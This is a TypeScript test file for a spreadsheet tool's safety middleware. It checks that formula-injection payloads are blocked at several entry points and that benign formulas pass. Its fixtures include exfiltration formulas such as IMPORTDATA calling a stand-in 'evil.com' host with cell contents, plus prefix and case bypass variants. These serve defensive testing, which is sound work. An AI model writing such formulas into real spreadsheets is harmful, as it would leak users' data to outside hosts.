/**
 * Adversarial formula injection pipeline tests.
 *
 * Exercises the full mutation-safety-middleware scanning pipeline with
 * malicious payloads to confirm injection is caught at every entry point —
 * including nested keys, arrays, and the passthrough flag enforcement.
 *
 * @see src/middleware/mutation-safety-middleware.ts
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { detectMutationSafetyViolation } from '../../src/middleware/mutation-safety-middleware.js';

const makeArgs = (action: string, extra: Record<string, unknown> = {}) => ({
  request: { action, spreadsheetId: '1abc', ...extra },
});

// ── Basic injection patterns ─────────────────────────────────────────────────

describe('Formula injection — dangerous formulas are blocked', () => {
  const DANGEROUS = [
    ['=IMPORTDATA("https://evil.com/exfil?d="&A1)', 'IMPORTDATA exfiltration'],
    ['=IMPORTRANGE("spreadsheet","Sheet1!A1:Z100")', 'IMPORTRANGE cross-sheet read'],
    ['=IMPORTHTML("https://evil.com","table",0)', 'IMPORTHTML web scrape'],
    ['=IMPORTFEED("https://evil.com/feed")', 'IMPORTFEED RSS exfil'],
    ['=IMPORTXML("https://evil.com/xml","//data")', 'IMPORTXML XML parse'],
    ['=GOOGLEFINANCE("GOOG","price")', 'GOOGLEFINANCE data leak'],
    ['=QUERY(Sheet1!A:Z,"SELECT *")', 'QUERY full sheet dump'],
    ['+IMPORTDATA("https://evil.com")', '+ prefix bypass attempt'],
    ['-IMPORTRANGE("id","range")', '- prefix bypass attempt'],
    ['@GOOGLEFINANCE("ticker")', '@ prefix bypass attempt'],
    ['=importdata("https://evil.com")', 'lowercase bypass attempt'],
    ['= IMPORTDATA("https://evil.com")', 'space after = bypass attempt'],
  ];

  it.each(DANGEROUS)('blocks %s (%s)', (formula) => {
    const violation = detectMutationSafetyViolation(
      makeArgs('write', { values: [[formula]] })
    );
    expect(violation).not.toBeNull();
    expect(violation?.path).toBeTruthy();
    expect(violation?.preview.length).toBeGreaterThan(0);
  });
});

// ── Benign payloads — must NOT be blocked ────────────────────────────────────

describe('Formula injection — safe payloads are allowed', () => {
  const SAFE = [
    ['=SUM(A1:A10)', 'SUM formula'],
    ['=VLOOKUP(A1,B:C,2,FALSE)', 'VLOOKUP formula'],
    ['=IF(A1>0,"yes","no")', 'IF formula'],
    ['=CONCATENATE(A1," ",B1)', 'CONCATENATE formula'],
    ['=TEXT(A1,"yyyy-mm-dd")', 'TEXT formula'],
    ['=AVERAGE(B2:B100)', 'AVERAGE formula'],
    ['=COUNTIF(A:A,">0")', 'COUNTIF formula'],
    ['plain text value', 'plain text'],
    ['100', 'number string'],
    ['', 'empty string'],
    ['https://example.com', 'URL without = prefix'],
  ];

  it.each(SAFE)('allows %s (%s)', (value) => {
    const violation = detectMutationSafetyViolation(
      makeArgs('write', { values: [[value]] })
    );
    expect(violation).toBeNull();
  });
});

// ── Read-only actions bypass scanning ────────────────────────────────────────

describe('Formula injection — read actions bypass scanning', () => {
  const READ_ACTIONS = ['read', 'batch_read', 'get', 'comprehensive', 'scout', 'status'];

  it.each(READ_ACTIONS)('does not scan action=%s', (action) => {
    const violation = detectMutationSafetyViolation(
      makeArgs(action, { values: [['=IMPORTDATA("https://evil.com")']] })
    );
    expect(violation).toBeNull();
  });
});

// ── Nested key scanning ──────────────────────────────────────────────────────

describe('Formula injection — nested key scanning', () => {
  it('catches injection in note field', () => {
    const v = detectMutationSafetyViolation(
      makeArgs('add_note', { note: '=IMPORTDATA("https://evil.com")' })
    );
    expect(v).not.toBeNull();
    expect(v?.path).toContain('note');
  });

  it('catches injection in title field', () => {
    const v = detectMutationSafetyViolation(
      makeArgs('create_table', { title: '=IMPORTRANGE("id","Sheet!A1")' })
    );
    expect(v).not.toBeNull();
  });

  it('catches injection in text field', () => {
    const v = detectMutationSafetyViolation(
      makeArgs('set_rich_text', { text: '=IMPORTXML("https://evil.com","//x")' })
    );
    expect(v).not.toBeNull();
  });

  it('catches injection in deeply nested batch_write values', () => {
    const v = detectMutationSafetyViolation(
      makeArgs('batch_write', {
        data: [
          { range: 'A1', values: [['normal', '=IMPORTHTML("https://evil.com","table",0)']] },
        ],
      })
    );
    expect(v).not.toBeNull();
  });

  it('catches injection in replacement field', () => {
    const v = detectMutationSafetyViolation(
      makeArgs('find_replace', {
        findValue: 'foo',
        replacement: '=GOOGLEFINANCE("GOOG")',
      })
    );
    expect(v).not.toBeNull();
  });
});

// ── safety.sanitizeFormulas opt-out ─────────────────────────────────────────

describe('Formula injection — safety bypass controls', () => {
  it('respects safety.sanitizeFormulas=false at request level', () => {
    const args = {
      request: {
        action: 'write',
        spreadsheetId: '1abc',
        values: [['=IMPORTDATA("https://example.com")']],
        safety: { sanitizeFormulas: false },
      },
    };
    const v = detectMutationSafetyViolation(args);
    expect(v).toBeNull();
  });

  it('does NOT allow passthrough via SERVAL_ALLOW_FORMULA_PASSTHROUGH in production', () => {
    const originalEnv = process.env['SERVAL_ALLOW_FORMULA_PASSTHROUGH'];
    const originalNode = process.env['NODE_ENV'];
    process.env['SERVAL_ALLOW_FORMULA_PASSTHROUGH'] = 'true';
    process.env['NODE_ENV'] = 'production';
    try {
      expect(() =>
        detectMutationSafetyViolation(
          makeArgs('write', { values: [['=IMPORTDATA("x")']] })
        )
      ).toThrow('SERVAL_ALLOW_FORMULA_PASSTHROUGH cannot be enabled in production');
    } finally {
      process.env['SERVAL_ALLOW_FORMULA_PASSTHROUGH'] = originalEnv ?? '';
      process.env['NODE_ENV'] = originalNode ?? 'test';
    }
  });
});

// ── Edge cases and robustness ────────────────────────────────────────────────

describe('Formula injection — edge cases', () => {
  it('handles circular reference guard without stack overflow', () => {
    const circular: Record<string, unknown> = {
      action: 'write',
      spreadsheetId: '1abc',
    };
    circular['self'] = circular;
    expect(() => detectMutationSafetyViolation({ request: circular })).not.toThrow();
  });

  it('returns null for non-mutation action even with malicious payload', () => {
    const v = detectMutationSafetyViolation(
      makeArgs('read', { values: [['=IMPORTDATA("https://evil.com")']] })
    );
    expect(v).toBeNull();
  });

  it('returns null when request is missing', () => {
    const v = detectMutationSafetyViolation({});
    expect(v).toBeNull();
  });

  it('returns null when spreadsheetId is missing', () => {
    const v = detectMutationSafetyViolation({
      request: { action: 'write', values: [['=IMPORTDATA("x")']] },
    });
    // No spreadsheetId — isLikelyMutationAction still returns true but no ID
    // The key check is that it doesn't throw
    expect(() =>
      detectMutationSafetyViolation({
        request: { action: 'write', values: [['=IMPORTDATA("x")']] },
      })
    ).not.toThrow();
  });

  it('handles depth limit correctly (no scanning beyond depth 12)', () => {
    // Build a 15-deep nested object with formula at the bottom
    let nested: Record<string, unknown> = {
      values: [['=IMPORTDATA("https://evil.com")']],
    };
    for (let i = 0; i < 14; i++) {
      nested = { wrapper: nested };
    }
    // At depth > 12 the scanner bails — this specific deep nesting won't fire
    // (intentional DoS prevention for huge payloads)
    expect(() =>
      detectMutationSafetyViolation(makeArgs('write', nested))
    ).not.toThrow();
  });

  it('truncates long formula previews at 60 characters', () => {
    const longFormula = '=IMPORTDATA("https://evil.com/' + 'x'.repeat(100) + '")';
    const v = detectMutationSafetyViolation(
      makeArgs('write', { values: [[longFormula]] })
    );
    expect(v).not.toBeNull();
    expect(v!.preview.length).toBeLessThanOrEqual(60);
    expect(v!.preview.endsWith('...')).toBe(true);
  });
});
